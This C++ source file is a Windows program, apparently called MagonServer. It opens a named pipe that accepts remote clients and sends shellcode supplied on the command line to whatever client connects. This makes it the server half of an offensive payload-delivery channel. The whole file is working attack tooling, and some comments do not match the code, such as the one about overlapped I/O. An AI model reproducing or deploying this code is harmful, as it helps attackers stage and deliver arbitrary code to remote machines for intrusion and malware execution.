#include <Windows.h>
#include <iostream>
#include <cstdint>

HANDLE hServerPipe = nullptr; // handle for the server pipe
BOOL bConnected = false; // indicates whether the client is connected 
BOOL bSent = false; // indicates whether the server successfully sent the shellcode to the client
DWORD dwBytesSent = 0; // number of bytes the server sent 

constexpr unsigned int uiMaxInstances = 1; // maximum number of instances for the server pipe to handle
constexpr unsigned int uiBuffSize = 4096;  // maximum number of bytes of the messages to read / write from the server pipe

int main(int argc, char *argv[]) {
    
    /* if no shellcode was provided, end the program */
    if (argc < 2) { 
        std::cerr << "Usage: <shellcode> [ MagonServer.exe ]" << std::endl;
        return EXIT_FAILURE;    
    }

    /* get the shellcode + it's size from argv*/
    const char* shellcode = argv[1]; 
    const DWORD dwShellcodeLen = strlen(shellcode);

    std::cout << "Shellcode: " << shellcode << '\n';
    std::cout << "Size: " << dwShellcodeLen << '\n';

    /* create the server pipe line */
    hServerPipe = CreateNamedPipeA(
        "\\\\.\\pipe\\MagonServer", // name of pipe
        PIPE_ACCESS_DUPLEX | 
        FILE_FLAG_OVERLAPPED, // read / write + allow remote pipes
        PIPE_TYPE_MESSAGE |
        PIPE_READMODE_MESSAGE |  
        PIPE_ACCEPT_REMOTE_CLIENTS, // message read mode 
        uiMaxInstances, // max number of instances
        uiBuffSize, // buffer size for output
        uiBuffSize, // buffer size for input
        0, // default timeout of 50 milliseconds
        NULL // default security attributes
    );

    /* check for the return value of CreateNamedPipeA */
    if (hServerPipe == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed in creating the server pipeline\n" << std::endl;
        return EXIT_FAILURE;
    }

    std::cout << "Created the server pipeline, waiting for connection...\n";

    bConnected = ConnectNamedPipe(
        hServerPipe, // the server pipe handle
        NULL // didn't open the pipe using FILE_FLAG_OVERLAPPED, so ignore
    );

    /* check for the return value of ConnectNamedPipe */
    if (bConnected == FALSE) {
        std::cerr << "Failed in connecting a client to the server pipeline, error code: " << GetLastError() << std::endl;
        DisconnectNamedPipe(hServerPipe);
        CloseHandle(hServerPipe);
        return EXIT_FAILURE;
    }

    std::cout << "Connected to the remote client\n";

    /* after connecting, can pass the shellcode + it's size to the client */
    bSent = WriteFile(
        hServerPipe,
        shellcode,
        dwShellcodeLen,
        &dwBytesSent,
        NULL
    );

    /* check for the return value of WriteFile + how many bytes had sent */
    if (bSent == FALSE || dwBytesSent != dwShellcodeLen) {
        std::cerr << "Failed in sending the client the shellcode, error code: " << GetLastError() << std::endl;
        DisconnectNamedPipe(hServerPipe);
        CloseHandle(hServerPipe);
        return EXIT_FAILURE;
    }

    std::cout << "Sent the client the shellcode\n";

    /* Flush the pipe to allow the client to read the pipe's contents 
       before disconnecting. Then disconnect the pipe, and close the 
       handle to this pipe instance. */

    FlushFileBuffers(hServerPipe);
    DisconnectNamedPipe(hServerPipe);
    CloseHandle(hServerPipe);

    std::cout << "Clsed the server pipeline, closing the program..." << std::endl;

    return 0;
}